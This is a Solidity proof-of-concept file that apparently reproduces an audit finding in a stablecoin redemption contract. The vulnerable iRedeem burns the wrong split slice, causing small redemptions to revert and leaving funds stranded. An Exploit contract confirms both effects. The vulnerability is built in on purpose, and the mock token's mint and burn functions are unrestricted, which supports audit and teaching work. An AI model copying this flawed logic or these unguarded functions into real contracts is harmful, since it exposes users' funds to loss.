// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  STBL — iRedeem burns the wrong split slice (Cyfrin, 2026-06)
    SYNTHETIC, cheatcode-free reduction of STBL_Redemption_Core.iRedeem.
    split() returns _A worth `_amt` and _B worth poolSVN - `_amt`.
    The pool keeps _A and withdraw() burns _B, while the user only approved `_amt`.
    A 1 ether redeem reverts. A 60 ether redeem on a 100 ether pool pays 60,
    burns 40, and leaves 20 USST in the redemption contract. */

contract ERC20 {
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory s, uint8 d) {
        symbol = s;
        decimals = d;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
        totalSupply += amt;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        allowance[from][msg.sender] -= amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function burn(address from, uint256 amt) external {
        balanceOf[from] -= amt;
        totalSupply -= amt;
    }
}

contract YLD {
    mapping(uint256 => uint256) public stableValueNet;
    uint256 public nextId = 1;

    function mint(uint256 value) external returns (uint256 id) {
        id = nextId;
        nextId += 1;
        stableValueNet[id] = value;
    }

    function split(uint256 nftId, uint256 amt) external returns (uint256 a, uint256 b) {
        uint256 pool = stableValueNet[nftId];
        require(amt > 0 && amt < pool, "range");
        a = nextId;
        nextId += 1;
        b = nextId;
        nextId += 1;
        stableValueNet[a] = amt; // S2 _A is the `_amt` slice
        stableValueNet[b] = pool - amt; // S3 _B is the remainder
        stableValueNet[nftId] = 0;
    }
}

contract Issuer {
    ERC20 public usst;
    YLD public yld;

    constructor(ERC20 u, YLD y) {
        usst = u;
        yld = y;
    }

    function withdraw(uint256 nftId) external {
        uint256 value = yld.stableValueNet(nftId);
        usst.transferFrom(msg.sender, address(this), value); // S5 pulls the slice that was passed in
        usst.burn(address(this), value);
    }
}

contract Redemption {
    ERC20 public usst;
    YLD public yld;
    Issuer public issuer;
    uint256 public nftId;
    uint256 public overpaid;
    uint256 public lastBurned;

    constructor(ERC20 u, YLD y, Issuer i) {
        usst = u;
        yld = y;
        issuer = i;
    }

    function deposit(uint256 id) external {
        nftId = id; // S1
    }

    function iRedeem(uint256 amt) external {
        (uint256 a, uint256 b) = yld.split(nftId, amt);
        nftId = a; // @> VULN: pool keeps the `_amt` slice and withdraws the remainder
        usst.transferFrom(msg.sender, address(this), amt); // S4 collects only `_amt`
        usst.approve(address(issuer), amt);
        uint256 burned = yld.stableValueNet(b);
        issuer.withdraw(b);
        lastBurned = burned;
        overpaid = amt - burned; // S6
    }
}

contract Exploit {
    uint256 public constant FINDING = 66734;
    ERC20 public usst;
    YLD public yld;
    Issuer public issuer;
    Redemption public redemption;
    bool public smallReverted;

    constructor() {
        usst = new ERC20("USST", 18);
        yld = new YLD();
        issuer = new Issuer(usst, yld);
        redemption = new Redemption(usst, yld, issuer);
    }

    function run() external {
        uint256 id = yld.mint(100 ether);
        redemption.deposit(id);
        usst.mint(address(this), 60 ether);
        usst.approve(address(redemption), type(uint256).max);
        try redemption.iRedeem(1 ether) {
            revert("small redeem passed");
        } catch {
            smallReverted = true; // S7
        }
        require(smallReverted, "dos");
        redemption.iRedeem(60 ether);
        require(redemption.overpaid() == 20 ether, "overpaid");
        require(redemption.lastBurned() == 40 ether, "burned");
        require(usst.balanceOf(address(redemption)) == 20 ether, "left");
        require(yld.stableValueNet(redemption.nftId()) == 60 ether, "pool kept amt");
        require(usst.balanceOf(address(this)) == 0, "user paid 60");
    }
}
